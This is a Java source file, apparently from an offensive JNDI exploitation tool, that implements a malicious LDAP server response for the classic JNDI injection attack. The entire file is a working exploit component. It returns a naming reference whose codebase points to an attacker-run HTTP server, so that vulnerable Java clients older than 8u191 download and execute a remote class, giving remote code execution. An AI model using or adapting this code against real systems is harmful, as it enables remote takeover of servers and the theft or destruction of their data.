package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/**
 * Classic JNDI attack. The server responds with a reference object.
 * When the reference is unpacked on the server side, if "javaFactory" class name is unknown for the server,
 *  its bytecode is loaded and executed from "http://hostname/xExportObject.class"
 *
 * Yields:
 *  RCE via remote classloading.
 *
 * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
 *
 * Requires:
 * - java <8u191
 *
 * @author artsploit
 */
@LdapMapping(uri = { "/", "/o=reference" })
public class RemoteReference implements LdapController {

    private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        Entry e = new Entry(base);
        System.out.println("Sending LDAP reference result for " + classloaderUrl + "xExportObject.class");
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "xUnknown"); //could be any unknown
        e.addAttribute("javaFactory", "xExportObject"); //could be any unknown
        e.addAttribute("javaCodeBase", classloaderUrl);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
